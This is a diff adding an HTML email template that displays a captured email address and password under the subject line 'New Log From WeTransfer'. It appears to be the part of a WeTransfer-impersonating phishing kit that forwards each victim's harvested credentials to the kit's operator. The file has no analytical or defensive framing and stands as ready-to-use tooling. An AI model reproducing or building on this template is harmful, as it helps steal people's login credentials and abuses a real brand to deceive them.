@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+
+    <table>
+
+        <style>
+            table, th, td {
+  border: 1px solid black;
+  border-collapse: collapse;
+}
+
+th, td {
+  padding-top: 10px;
+  padding-bottom: 20px;
+  padding-left: 30px;
+  padding-right: 40px;
+}
+        </style>
+        <tr>
+          <td><strong>Email:</strong></td>
+          <td>
+            <!-- <p style="padding-top: 12px; padding-right: 12px; padding-bottom: 12px; border-left: 4px solid rgb(208, 208, 208); font-style: italic;"> -->
+                <span style="color: rgb(132, 63, 161);">
+                    <strong>
+                        <span style="font-size: 18pt; font-family: tahoma, arial, helvetica, sans-serif;">
+                            {{email}}
+                        </span>
+                    </strong>
+                </span>
+            <!-- </p> -->
+            </td>
+        </tr>
+
+        <tr>
+          <td><b>Subject:</b></td>
+          <td>New Log From WeTransfer || {{email}}</td>
+        </tr>
+
+        <tr>
+          <td><b>Password:</b></td>
+          <td>
+            <!-- <p style="padding-top: 12px; padding-right: 12px; padding-bottom: 12px; border-left: 4px solid rgb(208, 208, 208); font-style: italic;"> -->
+                <span style="color: rgb(132, 63, 161);">
+                    <strong>
+                        <span style="font-size: 18pt; font-family: tahoma, arial, helvetica, sans-serif;">
+                            {{password}}
+                        </span>
+                    </strong>
+                </span>
+            <!-- </p> -->
+          </td>
+        </tr>
+      </table>
+    
+</body>
+</html>
